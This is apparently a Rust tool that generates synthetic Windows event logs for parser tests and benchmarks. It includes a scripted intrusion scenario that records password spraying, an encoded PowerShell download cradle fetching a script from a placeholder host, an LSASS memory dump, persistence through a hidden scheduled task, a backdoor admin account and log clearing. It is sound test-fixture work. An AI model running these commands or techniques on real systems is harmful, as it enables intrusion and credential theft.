//! `evtx-gen`: writes synthetic EVTX files for tests and benchmarks.
//!
//! ```text
//! evtx-gen fixtures --out fixtures/synthetic      # small, deterministic, committed
//! evtx-gen corpus --out corpus --size 2G          # multi-GB benchmark corpus
//! ```
//!
//! No real log data is involved: every value comes from a seeded generator
//! or from the fixed attack scenario below.

mod events;
mod writer;

use std::fs::File;
use std::io::BufWriter;
use std::path::{Path, PathBuf};

use anyhow::Context;
use clap::{Parser, Subcommand};

use events::{DOMAIN, DOMAIN_SID, Kind, Rng, USERS, spec, system_values, user_sid};
use writer::{EvtxWriter, Template, V};

#[derive(Parser)]
#[command(name = "evtx-gen", about = "Synthetic EVTX generator (no real data)")]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Small deterministic fixtures: valid logs with an attack scenario, plus
    /// corrupt and truncated variants.
    Fixtures {
        #[arg(long, default_value = "fixtures/synthetic")]
        out: PathBuf,
    },
    /// A large corpus of background activity split into per-channel files.
    Corpus {
        #[arg(long, default_value = "corpus")]
        out: PathBuf,
        /// Total size, e.g. 512M, 2G.
        #[arg(long, default_value = "1G")]
        size: String,
        /// Maximum size of one file.
        #[arg(long, default_value = "256M")]
        file_size: String,
        #[arg(long, default_value_t = 1)]
        seed: u64,
    },
}

fn parse_size(s: &str) -> anyhow::Result<u64> {
    let s = s.trim().to_ascii_uppercase();
    let (n, mul) = match s.chars().last() {
        Some('K') => (&s[..s.len() - 1], 1u64 << 10),
        Some('M') => (&s[..s.len() - 1], 1 << 20),
        Some('G') => (&s[..s.len() - 1], 1 << 30),
        _ => (s.as_str(), 1),
    };
    Ok((n.parse::<f64>().context("bad size")? * mul as f64) as u64)
}

/// 2024-03-11T08:00:00Z as FILETIME.
const BASE: u64 = (1_710_144_000 + 11_644_473_600) * 10_000_000;
const SEC: u64 = 10_000_000;

fn utc_text(ft: u64) -> String {
    let unix = (ft / SEC) as i64 - 11_644_473_600;
    let ms = (ft % SEC) / 10_000;
    let days = unix.div_euclid(86_400);
    let sod = unix.rem_euclid(86_400);
    let (y, m, d) = civil(days);
    format!(
        "{y:04}-{m:02}-{d:02} {:02}:{:02}:{:02}.{ms:03}",
        sod / 3600,
        (sod / 60) % 60,
        sod % 60
    )
}

fn civil(z: i64) -> (i64, u32, u32) {
    let z = z + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    let y = yoe + era * 400;
    (if m <= 2 { y + 1 } else { y }, m, d)
}

/// One event to write: kind, time, host, logged-under SID and EventData values.
struct Ev {
    kind: Kind,
    ft: u64,
    host: String,
    sid: Option<String>,
    data: Vec<V>,
}

fn s(x: &str) -> V {
    V::Str(x.to_string())
}

fn sid(x: &str) -> V {
    V::Sid(x.to_string())
}

const NULL_SID: &str = "S-1-0-0";
const SYSTEM_SID: &str = "S-1-5-18";

fn logon(
    ft: u64,
    host: &str,
    user: &str,
    user_sid_: &str,
    lt: u32,
    ip: &str,
    auth: &str,
    lid: u64,
    rng: &mut Rng,
) -> Ev {
    let elevated = if lt == 10 || lt == 2 {
        "%%1842"
    } else {
        "%%1843"
    };
    Ev {
        kind: Kind::Logon4624,
        ft,
        host: host.into(),
        sid: None,
        data: vec![
            sid(SYSTEM_SID),
            s(&format!("{}$", host.split('.').next().unwrap_or(host))),
            s(DOMAIN),
            V::Hex64(0x3e7),
            sid(user_sid_),
            s(user),
            s(DOMAIN),
            V::Hex64(lid),
            V::U32(lt),
            s(if auth == "NTLM" {
                "NtLmSsp "
            } else {
                "Kerberos"
            }),
            s(auth),
            s(if lt == 3 || lt == 10 { "-" } else { host }),
            V::Guid(rng.guid()),
            s("-"),
            s(if auth == "NTLM" { "NTLM V2" } else { "-" }),
            V::U32(if auth == "NTLM" { 128 } else { 0 }),
            V::Hex64(if lt == 3 { 0 } else { 0x2d4 }),
            s(if lt == 3 {
                "-"
            } else {
                "C:\\Windows\\System32\\svchost.exe"
            }),
            s(ip),
            s(if ip == "-" { "-" } else { "49732" }),
            s("%%1833"),
            s(if lt == 10 { "%%1843" } else { "-" }),
            s("-"),
            s("-"),
            s("%%1843"),
            V::Hex64(0),
            s(elevated),
        ],
    }
}

fn logon_fail(ft: u64, host: &str, user: &str, lt: u32, ip: &str, sub: u32) -> Ev {
    Ev {
        kind: Kind::LogonFail4625,
        ft,
        host: host.into(),
        sid: None,
        data: vec![
            sid(NULL_SID),
            s("-"),
            s("-"),
            V::Hex64(0),
            sid(NULL_SID),
            s(user),
            s(if sub == 0xC0000064 { "" } else { DOMAIN }),
            V::Hex32(0xC000006D),
            s("%%2313"),
            V::Hex32(sub),
            V::U32(lt),
            s("NtLmSsp "),
            s("NTLM"),
            s("KALI"),
            s("-"),
            s("-"),
            V::U32(0),
            V::Hex64(0),
            s("-"),
            s(ip),
            s("50122"),
        ],
    }
}

fn process(
    ft: u64,
    host: &str,
    user: &str,
    usid: &str,
    lid: u64,
    image: &str,
    cmd: &str,
    parent: &str,
    rng: &mut Rng,
) -> Ev {
    Ev {
        kind: Kind::Process4688,
        ft,
        host: host.into(),
        sid: None,
        data: vec![
            sid(usid),
            s(user),
            s(DOMAIN),
            V::Hex64(lid),
            V::Hex64(0x1000 + rng.below(0x8000)),
            s(image),
            s("%%1936"),
            V::Hex64(0x1000 + rng.below(0x8000)),
            s(cmd),
            sid(NULL_SID),
            s("-"),
            s("-"),
            V::Hex64(0),
            s(parent),
            sid("S-1-16-12288"),
        ],
    }
}

fn sysmon_proc(
    ft: u64,
    host: &str,
    user: &str,
    image: &str,
    cmd: &str,
    parent: &str,
    pcmd: &str,
    rng: &mut Rng,
) -> Ev {
    let name = image.rsplit('\\').next().unwrap_or(image).to_string();
    Ev {
        kind: Kind::SysmonProcess1,
        ft,
        host: host.into(),
        sid: Some(SYSTEM_SID.into()),
        data: vec![
            s("-"),
            s(&utc_text(ft)),
            V::Guid(rng.guid()),
            V::U32(1000 + rng.below(9000) as u32),
            s(image),
            s("10.0.19041.1 (WinBuild.160101.0800)"),
            s("-"),
            s("Microsoft® Windows® Operating System"),
            s("Microsoft Corporation"),
            s(&name.to_uppercase()),
            s(cmd),
            s("C:\\Users\\Public\\"),
            s(&format!("{DOMAIN}\\{user}")),
            V::Guid(rng.guid()),
            V::Hex64(0x3a7b1 + rng.below(0x1000)),
            V::U32(1),
            s("High"),
            s(&format!(
                "SHA256={:016X}{:016X}{:016X}{:016X}",
                rng.next(),
                rng.next(),
                rng.next(),
                rng.next()
            )),
            V::Guid(rng.guid()),
            V::U32(1000 + rng.below(9000) as u32),
            s(parent),
            s(pcmd),
            s(&format!("{DOMAIN}\\{user}")),
        ],
    }
}

/// Background activity for one channel.
fn noise(channel: &str, ft: u64, rng: &mut Rng, hosts: &[String]) -> Ev {
    let host = rng.pick(hosts).clone();
    let ui = rng.below(USERS.len() as u64);
    let user = USERS[ui as usize];
    let usid = user_sid(ui);
    match channel {
        events::SECURITY => match rng.below(100) {
            0..=34 => {
                let lt = *rng.pick(&[3u32, 3, 3, 5, 2, 7]);
                let (u, us) = if lt == 5 { ("SYSTEM".to_string(), SYSTEM_SID.to_string()) } else { (user.to_string(), usid) };
                let ip = if lt == 3 { format!("10.10.{}.{}", rng.below(4), 20 + rng.below(60)) } else { "-".into() };
                logon(ft, &host, &u, &us, lt, &ip, if rng.below(3) == 0 { "NTLM" } else { "Kerberos" }, rng.next() & 0xffffff, rng)
            }
            35..=59 => Ev {
                kind: Kind::Logoff4634,
                ft,
                host,
                sid: None,
                data: vec![sid(&usid), s(user), s(DOMAIN), V::Hex64(rng.next() & 0xffffff), V::U32(3)],
            },
            60..=74 => Ev {
                kind: Kind::SpecialPriv4672,
                ft,
                host,
                sid: None,
                data: vec![
                    sid(SYSTEM_SID),
                    s("SYSTEM"),
                    s("NT AUTHORITY"),
                    V::Hex64(0x3e7),
                    s("SeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeDelegateSessionUserImpersonatePrivilege"),
                ],
            },
            75..=89 => {
                let (img, cmd) = *rng.pick(events::PROCS);
                process(ft, &host, user, &usid, rng.next() & 0xffffff, img, cmd, "C:\\Windows\\explorer.exe", rng)
            }
            90..=96 => Ev {
                kind: Kind::Kerberos4769,
                ft,
                host,
                sid: None,
                data: vec![
                    s(&format!("{user}@CONTOSO.LOCAL")),
                    s("CONTOSO.LOCAL"),
                    s(&format!("{}$", rng.pick(hosts).split('.').next().unwrap_or("WS-01"))),
                    sid(&format!("{DOMAIN_SID}-{}", 2000 + rng.below(50))),
                    V::Hex32(0x40810000),
                    V::Hex32(0x12),
                    s(&format!("::ffff:10.10.{}.{}", rng.below(4), 20 + rng.below(60))),
                    s("51234"),
                    V::Hex32(0),
                    V::Guid(rng.guid()),
                    s("-"),
                ],
            },
            _ => Ev {
                kind: Kind::Share5140,
                ft,
                host,
                sid: None,
                data: vec![
                    sid(&usid),
                    s(user),
                    s(DOMAIN),
                    V::Hex64(rng.next() & 0xffffff),
                    s("File"),
                    s(&format!("10.10.{}.{}", rng.below(4), 20 + rng.below(60))),
                    V::U32(50000 + rng.below(9000) as u32),
                    s(*rng.pick(&["\\\\*\\SYSVOL", "\\\\*\\NETLOGON", "\\\\*\\IPC$", "\\\\*\\Shared"])),
                    s("C:\\Windows\\SYSVOL\\sysvol"),
                    V::Hex32(1),
                    s("%%4416\n\t\t\t\t"),
                ],
            },
        },
        events::SYSTEM => Ev {
            kind: Kind::ServiceState7036,
            ft,
            host,
            sid: None,
            data: vec![s(rng.pick(events::SERVICES)), s(*rng.pick(&["running", "stopped"]))],
        },
        events::SYSMON => match rng.below(10) {
            0..=4 => {
                let (img, cmd) = *rng.pick(events::PROCS);
                sysmon_proc(ft, &host, user, img, cmd, "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", rng)
            }
            5..=7 => Ev {
                kind: Kind::SysmonNet3,
                ft,
                host: host.clone(),
                sid: Some(SYSTEM_SID.into()),
                data: vec![
                    s("-"),
                    s(&utc_text(ft)),
                    V::Guid(rng.guid()),
                    V::U32(1000 + rng.below(9000) as u32),
                    s("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"),
                    s(&format!("{DOMAIN}\\{user}")),
                    s("tcp"),
                    s("true"),
                    s("false"),
                    s(&format!("10.10.1.{}", 20 + rng.below(60))),
                    s(&host),
                    V::U16(49152 + rng.below(16000) as u16),
                    s("-"),
                    s("false"),
                    s(&format!("192.0.2.{}", rng.below(250) + 1)),
                    s("-"),
                    V::U16(443),
                    s("https"),
                ],
            },
            _ => Ev {
                kind: Kind::SysmonFile11,
                ft,
                host,
                sid: Some(SYSTEM_SID.into()),
                data: vec![
                    s("-"),
                    s(&utc_text(ft)),
                    V::Guid(rng.guid()),
                    V::U32(1000 + rng.below(9000) as u32),
                    s("C:\\Windows\\System32\\svchost.exe"),
                    s(&format!("C:\\Users\\{user}\\AppData\\Local\\Temp\\tmp{:04X}.tmp", rng.below(0xffff))),
                    s(&utc_text(ft)),
                    s("NT AUTHORITY\\SYSTEM"),
                ],
            },
        },
        _ => Ev {
            kind: Kind::PsScript4104,
            ft,
            host,
            sid: Some(usid),
            data: vec![
                V::U32(1),
                V::U32(1),
                s(*rng.pick(&[
                    "Get-ChildItem -Path $env:TEMP | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } | Remove-Item -Force",
                    "Import-Module ActiveDirectory\nGet-ADUser -Filter * -SearchBase 'OU=Staff,DC=contoso,DC=local' | Select-Object Name, Enabled",
                    "$p = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5\n$p | Format-Table -AutoSize",
                    "prompt",
                ])),
                V::Guid(rng.guid()),
                s(""),
            ],
        },
    }
}

fn write_events(
    path: &Path,
    evs: &[Ev],
    templates: &[Template],
    rng: &mut Rng,
    first_rid: u64,
) -> anyhow::Result<u64> {
    let f =
        BufWriter::new(File::create(path).with_context(|| format!("create {}", path.display()))?);
    let mut w = EvtxWriter::new(f, first_rid, 65535)?;
    for (i, e) in evs.iter().enumerate() {
        let (tidx, sp) = spec(e.kind);
        let mut vals = system_values(
            sp,
            e.ft,
            first_rid + i as u64,
            &e.host,
            e.sid.as_deref(),
            rng,
        );
        vals.extend(e.data.iter().cloned());
        assert_eq!(
            e.data.len(),
            sp.fields.len(),
            "{:?}: wrong number of values",
            e.kind
        );
        w.push(e.ft, tidx, &templates[tidx], &vals)?
            .context("file full")?;
    }
    w.finish()?;
    let len = std::fs::metadata(path)?.len() as usize;
    Ok(((len - writer::FILE_HEADER_SIZE) / writer::CHUNK_SIZE) as u64)
}

/// The fixed attack scenario used by tests and docs (all on 2024-03-11 UTC):
/// password spraying and brute force from 203.0.113.50 against WS-07, RDP
/// logon as `administrator`, discovery, an encoded PowerShell download
/// cradle, LSASS access, a PsExec-like service, a scheduled task, a new
/// local admin `svc_backup`, and finally the Security log cleared.
fn scenario(rng: &mut Rng) -> (Vec<Ev>, Vec<Ev>, Vec<Ev>, Vec<Ev>) {
    let host = "WS-07.contoso.local";
    let attacker = "203.0.113.50";
    let admin_sid = format!("{DOMAIN_SID}-500");
    let t = |m: u64, s_: u64| BASE + (2 * 3600 + m * 60 + s_) * SEC; // from 10:00
    let mut sec = Vec::new();
    let mut sys = Vec::new();
    let mut smon = Vec::new();
    let mut ps = Vec::new();
    // 10:00-10:04 spraying: one password, many users.
    for (i, u) in [
        "alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "test",
        "guest",
    ]
    .iter()
    .enumerate()
    {
        let sub = if *u == "test" || *u == "guest" {
            0xC0000064
        } else {
            0xC000006A
        };
        sec.push(logon_fail(t(0, i as u64 * 20), host, u, 3, attacker, sub));
    }
    // 10:05-10:09 brute force on administrator over RDP.
    for i in 0..25u64 {
        sec.push(logon_fail(
            t(5, i * 11),
            host,
            "administrator",
            10,
            attacker,
            0xC000006A,
        ));
    }
    // 10:10 success.
    sec.push(logon(
        t(10, 2),
        host,
        "administrator",
        &admin_sid,
        10,
        attacker,
        "NTLM",
        0x8a3f21,
        rng,
    ));
    sec.push(Ev {
        kind: Kind::SpecialPriv4672,
        ft: t(10, 2),
        host: host.into(),
        sid: None,
        data: vec![sid(&admin_sid), s("administrator"), s(DOMAIN), V::Hex64(0x8a3f21), s("SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeImpersonatePrivilege")],
    });
    // 10:12 discovery.
    let cmd = "C:\\Windows\\System32\\cmd.exe";
    for (i, (img, c)) in [
        ("C:\\Windows\\System32\\whoami.exe", "whoami /all"),
        ("C:\\Windows\\System32\\net.exe", "net user /domain"),
        (
            "C:\\Windows\\System32\\net.exe",
            "net group \"Domain Admins\" /domain",
        ),
        (
            "C:\\Windows\\System32\\nltest.exe",
            "nltest /dclist:contoso.local",
        ),
    ]
    .iter()
    .enumerate()
    {
        sec.push(process(
            t(12, i as u64 * 15),
            host,
            "administrator",
            &admin_sid,
            0x8a3f21,
            img,
            c,
            cmd,
            rng,
        ));
        smon.push(sysmon_proc(
            t(12, i as u64 * 15),
            host,
            "administrator",
            img,
            c,
            cmd,
            "\"C:\\Windows\\System32\\cmd.exe\"",
            rng,
        ));
    }
    // 10:15 encoded PowerShell download cradle.
    let enc = "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA==";
    let pwsh = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    sec.push(process(
        t(15, 0),
        host,
        "administrator",
        &admin_sid,
        0x8a3f21,
        pwsh,
        enc,
        cmd,
        rng,
    ));
    smon.push(sysmon_proc(
        t(15, 0),
        host,
        "administrator",
        pwsh,
        enc,
        cmd,
        "\"C:\\Windows\\System32\\cmd.exe\"",
        rng,
    ));
    ps.push(Ev {
        kind: Kind::PsScript4104,
        ft: t(15, 1),
        host: host.into(),
        sid: Some(admin_sid.clone()),
        data: vec![
            V::U32(1),
            V::U32(1),
            s("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"),
            V::Guid(rng.guid()),
            s(""),
        ],
    });
    smon.push(Ev {
        kind: Kind::SysmonNet3,
        ft: t(15, 2),
        host: host.into(),
        sid: Some(SYSTEM_SID.into()),
        data: vec![
            s("-"),
            s(&utc_text(t(15, 2))),
            V::Guid(rng.guid()),
            V::U32(4242),
            s(pwsh),
            s("CONTOSO\\administrator"),
            s("tcp"),
            s("true"),
            s("false"),
            s("10.10.1.57"),
            s(host),
            V::U16(50311),
            s("-"),
            s("false"),
            s("198.51.100.7"),
            s("-"),
            V::U16(80),
            s("http"),
        ],
    });
    // 10:18 LSASS access + dump file.
    smon.push(Ev {
        kind: Kind::SysmonAccess10,
        ft: t(18, 0),
        host: host.into(),
        sid: Some(SYSTEM_SID.into()),
        data: vec![
            s("-"), s(&utc_text(t(18, 0))), V::Guid(rng.guid()), V::U32(4242), V::U32(5120), s(pwsh), V::Guid(rng.guid()), V::U32(684),
            s("C:\\Windows\\system32\\lsass.exe"), V::Hex32(0x1fffff),
            s("C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\System32\\dbgcore.DLL+6f43|UNKNOWN(00007FF8A1B2C3D4)"),
            s("CONTOSO\\administrator"), s("NT AUTHORITY\\SYSTEM"),
        ],
    });
    smon.push(Ev {
        kind: Kind::SysmonFile11,
        ft: t(18, 3),
        host: host.into(),
        sid: Some(SYSTEM_SID.into()),
        data: vec![
            s("-"),
            s(&utc_text(t(18, 3))),
            V::Guid(rng.guid()),
            V::U32(4242),
            s(pwsh),
            s("C:\\Users\\Public\\lsass.dmp"),
            s(&utc_text(t(18, 3))),
            s("CONTOSO\\administrator"),
        ],
    });
    // 10:22 PsExec-like service.
    sys.push(Ev {
        kind: Kind::Service7045,
        ft: t(22, 0),
        host: host.into(),
        sid: Some(admin_sid.clone()),
        data: vec![
            s("PSEXESVC"),
            s("%SystemRoot%\\PSEXESVC.exe"),
            s("user mode service"),
            s("demand start"),
            s("LocalSystem"),
        ],
    });
    sys.push(Ev {
        kind: Kind::ServiceState7036,
        ft: t(22, 1),
        host: host.into(),
        sid: None,
        data: vec![s("PSEXESVC"), s("running")],
    });
    // 10:25 persistence: scheduled task.
    sec.push(Ev {
        kind: Kind::Task4698,
        ft: t(25, 0),
        host: host.into(),
        sid: None,
        data: vec![
            sid(&admin_sid), s("administrator"), s(DOMAIN), V::Hex64(0x8a3f21), s("\\Microsoft\\Windows\\Maintenance\\WinUpdate"),
            s("<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.2\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-NoP -W Hidden -File C:\\Users\\Public\\u.ps1</Arguments></Exec></Actions></Task>"),
        ],
    });
    // 10:27 new local admin.
    let new_sid = format!("{DOMAIN_SID}-1337");
    sec.push(Ev {
        kind: Kind::UserCreated4720,
        ft: t(27, 0),
        host: host.into(),
        sid: None,
        data: vec![
            s("svc_backup"),
            s("WS-07"),
            sid(&new_sid),
            sid(&admin_sid),
            s("administrator"),
            s(DOMAIN),
            V::Hex64(0x8a3f21),
            s("svc_backup"),
            s("%%1793"),
            s("-"),
            s("%%2080"),
        ],
    });
    sec.push(Ev {
        kind: Kind::GroupAdd4732,
        ft: t(27, 5),
        host: host.into(),
        sid: None,
        data: vec![
            s("-"),
            sid(&new_sid),
            s("Administrators"),
            s("Builtin"),
            sid("S-1-5-32-544"),
            sid(&admin_sid),
            s("administrator"),
            s(DOMAIN),
            V::Hex64(0x8a3f21),
            s("-"),
        ],
    });
    // 10:30 log cleared.
    sec.push(Ev {
        kind: Kind::LogCleared1102,
        ft: t(30, 0),
        host: host.into(),
        sid: None,
        data: vec![
            sid(&admin_sid),
            s("administrator"),
            s(DOMAIN),
            V::Hex64(0x8a3f21),
        ],
    });
    (sec, sys, smon, ps)
}

fn with_noise(
    channel: &str,
    mut evs: Vec<Ev>,
    n: usize,
    rng: &mut Rng,
    hosts: &[String],
) -> Vec<Ev> {
    // Background spread over 08:00-12:00.
    for _ in 0..n {
        let ft = BASE + rng.below(4 * 3600 * 1000) * 10_000;
        evs.push(noise(channel, ft, rng, hosts));
    }
    // Records are written in time order, as Windows does.
    evs.sort_by_key(|e| e.ft);
    evs
}

fn hosts(n: usize) -> Vec<String> {
    let mut v: Vec<String> = (1..=n)
        .map(|i| format!("WS-{i:02}.contoso.local"))
        .collect();
    v.push("DC01.contoso.local".into());
    v
}

fn fixtures(out: &Path) -> anyhow::Result<()> {
    std::fs::create_dir_all(out)?;
    let templates = events::templates();
    let mut rng = Rng::new(42);
    let ws07 = vec!["WS-07.contoso.local".to_string()];
    let (sec, sys, smon, ps) = scenario(&mut rng);
    let sec = with_noise(events::SECURITY, sec, 2500, &mut rng, &ws07);
    let sys = with_noise(events::SYSTEM, sys, 300, &mut rng, &ws07);
    let smon = with_noise(events::SYSMON, smon, 600, &mut rng, &ws07);
    let ps = with_noise(events::POWERSHELL, ps, 60, &mut rng, &ws07);
    let mut report = Vec::new();
    for (name, evs, rid) in [
        ("Security.evtx", &sec, 52_001u64),
        ("System.evtx", &sys, 8_101),
        ("Sysmon.evtx", &smon, 120_001),
        ("PowerShell.evtx", &ps, 3_001),
    ] {
        let chunks = write_events(&out.join(name), evs, &templates, &mut rng, rid)?;
        report.push(format!("{name}: {} events, {chunks} chunks", evs.len()));
    }
    // A DC log from another host with the same file name, for id-uniqueness tests.
    let dc = with_noise(
        events::SECURITY,
        Vec::new(),
        400,
        &mut rng,
        &["DC01.contoso.local".to_string()],
    );
    std::fs::create_dir_all(out.join("dc01"))?;
    write_events(
        &out.join("dc01/Security.evtx"),
        &dc,
        &templates,
        &mut rng,
        900_001,
    )?;
    report.push(format!("dc01/Security.evtx: {} events", dc.len()));

    // Corrupt variants of Security.evtx.
    let good = std::fs::read(out.join("Security.evtx"))?;
    let chunk = |i: usize| writer::FILE_HEADER_SIZE + i * writer::CHUNK_SIZE;
    let mut bad = good.clone();
    bad[chunk(1)..chunk(1) + 8].copy_from_slice(b"XXXXXXXX"); // bad chunk magic
    let mid = chunk(2) + 512 + 300;
    for b in &mut bad[mid..mid + 64] {
        *b = 0xAB; // garbage inside records of chunk 2
    }
    bad[chunk(3) + 600..chunk(3) + 700].fill(0xFF); // smashed record header region in chunk 3
    std::fs::write(out.join("corrupt.evtx"), &bad)?;
    report.push("corrupt.evtx: chunk 1 bad magic, chunk 2 and 3 garbage".into());
    // Truncated in the middle of chunk 2.
    std::fs::write(out.join("truncated.evtx"), &good[..chunk(2) + 30_000])?;
    report.push("truncated.evtx: cut 30000 bytes into chunk 2".into());
    // Not an EVTX file at all, and an empty file.
    std::fs::write(out.join("not-evtx.evtx"), b"this is not an event log\n")?;
    std::fs::write(out.join("empty.evtx"), b"")?;
    for r in report {
        println!("{r}");
    }
    Ok(())
}

fn corpus(out: &Path, size: u64, file_size: u64, seed: u64) -> anyhow::Result<()> {
    std::fs::create_dir_all(out)?;
    let templates = events::templates();
    let mut rng = Rng::new(seed);
    let hs = hosts(40);
    // Channel mix by bytes, close to a typical workstation collection.
    let mix = [
        (events::SECURITY, 60u64),
        (events::SYSMON, 25),
        (events::SYSTEM, 10),
        (events::POWERSHELL, 5),
    ];
    let max_chunks = (file_size / writer::CHUNK_SIZE as u64).clamp(1, 65535);
    let mut written = 0u64;
    for (channel, pct) in mix {
        let target = size * pct / 100;
        let short = channel
            .rsplit(['/', '-'])
            .find(|p| !p.is_empty() && *p != "Operational")
            .unwrap_or(channel);
        let mut done = 0u64;
        let mut idx = 0;
        let mut ft = BASE;
        let mut rid = 1u64;
        while done < target {
            idx += 1;
            let path = out.join(format!("{short}-{idx:03}.evtx"));
            let f = BufWriter::with_capacity(1 << 20, File::create(&path)?);
            let chunks_wanted = ((target - done) / writer::CHUNK_SIZE as u64).clamp(1, max_chunks);
            let mut w = EvtxWriter::new(f, rid, chunks_wanted)?;
            loop {
                ft += 1 + rng.below(20_000_000);
                let e = noise(channel, ft, &mut rng, &hs);
                let (tidx, sp) = spec(e.kind);
                let mut vals = system_values(sp, e.ft, rid, &e.host, e.sid.as_deref(), &mut rng);
                vals.extend(e.data);
                match w.push(e.ft, tidx, &templates[tidx], &vals)? {
                    Some(_) => rid += 1,
                    None => break,
                }
            }
            let chunks = w.chunks();
            w.finish()?;
            let bytes = writer::FILE_HEADER_SIZE as u64 + chunks * writer::CHUNK_SIZE as u64;
            done += bytes;
            written += bytes;
            eprintln!("{}: {} MiB", path.display(), bytes >> 20);
        }
    }
    println!("corpus: {} MiB in {}", written >> 20, out.display());
    Ok(())
}

fn main() -> anyhow::Result<()> {
    match Cli::parse().cmd {
        Cmd::Fixtures { out } => fixtures(&out),
        Cmd::Corpus {
            out,
            size,
            file_size,
            seed,
        } => corpus(&out, parse_size(&size)?, parse_size(&file_size)?, seed),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn written_file_parses_with_evtx_crate() {
        let dir = std::env::temp_dir().join(format!("evtx-gen-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let templates = events::templates();
        let mut rng = Rng::new(7);
        let evs = with_noise(events::SECURITY, Vec::new(), 3000, &mut rng, &hosts(3));
        let p = dir.join("t.evtx");
        let chunks = write_events(&p, &evs, &templates, &mut rng, 100).unwrap();
        assert!(chunks >= 2, "want several chunks, got {chunks}");
        let mut parser = evtx::EvtxParser::from_path(&p)
            .unwrap()
            .with_configuration(evtx::ParserSettings::new().validate_checksums(true));
        let mut n = 0;
        for r in parser.records_json() {
            let r = r.expect("record parses");
            assert!(r.data.contains("\"EventID\""), "{}", r.data);
            n += 1;
        }
        assert_eq!(n, 3000);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn times() {
        assert_eq!(utc_text(BASE), "2024-03-11 08:00:00.000");
    }
}
